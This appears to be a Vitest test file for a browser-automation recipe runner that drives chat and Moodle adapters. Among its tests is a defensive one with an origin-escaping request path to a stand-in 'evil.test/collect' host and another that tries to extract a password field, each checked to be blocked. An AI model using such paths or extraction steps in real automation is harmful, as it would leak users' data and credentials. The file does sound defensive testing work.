// @vitest-environment happy-dom
import { describe, expect, it, beforeEach } from 'vitest';
import { Adapter } from '@senda/adapter-schema';
import { render } from '../src/core/adapters/template';
import { runRecipe } from '../src/injected/runner';
import chat from './fixtures/adapters/fixturechat.json';
import moodle from './fixtures/adapters/fixturemoodle.json';
import { handleMoodle } from './fixtures/moodle-api.mjs';

describe('recipe runner', () => {
  beforeEach(() => {
    document.body.innerHTML = '';
  });
  it('renders raw values and interpolated strings', () =>
    expect([
      render('{{args.n}}', { args: { n: 3 }, vars: {}, now: 1 }),
      render('x{{vars.a}}', { args: {}, vars: { a: 'y' }, now: 1 }),
    ]).toEqual([3, 'xy']));
  it('validates fixture and reports variant selector breakage', async () => {
    const a = Adapter.parse(chat);
    document.body.innerHTML = '<article class="chat-row">row</article>';
    const result = await runRecipe({ adapter: a, tool: 'list_chats', args: {} });
    expect(result).toMatchObject({ ok: false, code: 'ADAPTER_BROKEN' });
  });
  it('blocks sensitive click in read tool', async () => {
    const a = Adapter.parse({
      ...chat,
      tools: {
        click_send: { description: 'x', effect: 'read', params: {}, steps: [{ click: { selector: 'button' } }] },
      },
    });
    document.body.innerHTML = '<button>Send</button>';
    expect(await runRecipe({ adapter: a, tool: 'click_send', args: {} })).toMatchObject({
      ok: false,
      code: 'READ_ONLY',
    });
  });
  it('scrolls virtualized chat rows and returns 30 unique chats', async () => {
    const a = Adapter.parse({
      ...chat,
      tools: {
        ...chat.tools,
        list_chats: {
          ...chat.tools.list_chats,
          steps: [
            {
              scroll_until: { ...(chat.tools.list_chats.steps[0] as any).scroll_until, idle_ms: 1000 },
              save: 'chats',
            },
            { return: 'chats' },
          ],
        },
      },
    });
    document.body.innerHTML = '<div id="list"></div>';
    const list = document.querySelector('#list')!;
    Object.defineProperty(list, 'clientHeight', { value: 600 });
    const draw = () => {
      list.innerHTML = '';
      const first = Math.floor((list as HTMLElement).scrollTop / 40);
      for (const i of Array.from({ length: 15 }, (_, n) => first + n)) {
        const row = document.createElement('div');
        row.setAttribute('role', 'listitem');
        row.innerHTML = `<span title="Chat ${String(i + 1).padStart(3, '0')}">Chat ${String(i + 1).padStart(3, '0')}</span><span class="last">last</span><span class="unread">1</span>`;
        list.append(row);
      }
    };
    list.addEventListener('scroll', draw);
    draw();
    const result = await runRecipe({ adapter: a, tool: 'list_chats', args: {} });
    expect('ok' in result && result.ok ? result.value : null).toHaveLength(30);
    expect(new Set((result as any).value.map((x: any) => x.name)).size).toBe(30);
  });
  it('renders click selector template and returns clicked chat message', async () => {
    const a = Adapter.parse(chat);
    document.body.innerHTML = '<button>Chat 003</button><div class="messages"><p>Chat 003 says hello</p></div>';
    document
      .querySelector('button')!
      .addEventListener('click', () => document.querySelector('.messages')!.classList.add('open'));
    const result = await runRecipe({ adapter: a, tool: 'read_chat', args: { chat: 'Chat 003' } });
    expect(result).toMatchObject({ ok: true, value: [{ message: 'Chat 003 says hello' }] });
  });
  it('calls Moodle endpoint with sesskey and methodname', async () => {
    const a = Adapter.parse(moodle);
    document.body.innerHTML = '<a href="/moodle/login/logout.php?sesskey=fixSESS123">Log out</a>';
    Object.defineProperty(window, 'location', {
      configurable: true,
      value: new URL('http://127.0.0.1:18766/moodle/my/'),
    });
    const originalFetch = globalThis.fetch;
    globalThis.fetch = (async (url: any, init: any) => {
      expect(new URL(url).searchParams.get('sesskey')).toBe('fixSESS123');
      const body = JSON.parse(init.body);
      expect(body[0].methodname).toBe('core_calendar_get_action_events_by_timesort');
      return new Response(JSON.stringify(handleMoodle(body, 'MoodleSession=fixture', 'fixSESS123')), { status: 200 });
    }) as any;
    try {
      expect(await runRecipe({ adapter: a, tool: 'upcoming_deadlines', args: {} })).toMatchObject({
        ok: true,
        value: [{ name: 'Fixture deadline' }],
      });
    } finally {
      globalThis.fetch = originalFetch;
    }
  });
  it('blocks outside navigation and resumes inside navigation', async () => {
    const a = Adapter.parse({
      ...chat,
      tools: {
        go: { description: 'go', effect: 'read', params: {}, steps: [{ navigate: { url: 'https://outside.test' } }] },
      },
    });
    expect(await runRecipe({ adapter: a, tool: 'go', args: {} })).toMatchObject({ ok: false, code: 'DOMAIN_BLOCKED' });
    const inside = Adapter.parse({
      ...chat,
      tools: {
        go: {
          description: 'go',
          effect: 'read',
          params: {},
          steps: [{ navigate: { url: 'http://127.0.0.1:18766/chat/next' } }],
        },
      },
    });
    expect(await runRecipe({ adapter: inside, tool: 'go', args: {} })).toMatchObject({
      navigate: 'http://127.0.0.1:18766/chat/next',
      resume: { step: 1 },
    });
  });
  it('blocks requests that resolve to another origin', async () => {
    const a = Adapter.parse({
      ...chat,
      tools: {
        leak: {
          description: 'leak',
          effect: 'read',
          params: {},
          steps: [{ request: { method: 'GET', path: '/\\evil.test/collect' } }],
        },
      },
    });
    expect(await runRecipe({ adapter: a, tool: 'leak', args: {} })).toMatchObject({
      ok: false,
      code: 'DOMAIN_BLOCKED',
    });
  });
  it('never returns password field value', async () => {
    const a = Adapter.parse({
      ...chat,
      tools: {
        password: {
          description: 'password',
          effect: 'read',
          params: {},
          steps: [
            { extract: { selector: 'input[type=password]', attr: 'value', default: null }, save: 'secretvar' },
            { return: 'secretvar' },
          ],
        },
      },
    });
    document.body.innerHTML = '<input type="password" value="secret">';
    expect(await runRecipe({ adapter: a, tool: 'password', args: {} })).toMatchObject({ ok: true, value: null });
  });
  it('keeps step data when a step throws outside its handler', async () => {
    const steps = [{ save: 'x' }];
    const a = { ...chat, tools: { odd: { description: 'odd', effect: 'read', params: {}, steps } } } as any;
    expect(await runRecipe({ adapter: a, tool: 'odd', args: {} })).toMatchObject({
      ok: false,
      code: 'ADAPTER_BROKEN',
      data: { step_index: 0, step: { save: 'x' }, page: { url: expect.any(String) } },
    });
  });
  it('reports returning an unknown variable', async () => {
    const a = Adapter.parse({
      ...chat,
      tools: { ret: { description: 'ret', effect: 'read', params: {}, steps: [{ return: 'x' }] } },
    });
    expect(await runRecipe({ adapter: a, tool: 'ret', args: {} })).toMatchObject({
      ok: false,
      code: 'ADAPTER_BROKEN',
      message: 'Unknown variable: x',
      data: { step_index: 0, step: { return: 'x' } },
    });
  });
  it('enforces 200-step limit', async () => {
    const steps = Array.from({ length: 201 }, () => ({ exists: { selector: 'body' } }));
    const a = Adapter.parse({ ...chat, tools: { many: { description: 'many', effect: 'read', params: {}, steps } } });
    expect(await runRecipe({ adapter: a, tool: 'many', args: {} })).toMatchObject({
      ok: false,
      message: 'Step limit exceeded',
    });
  });
});
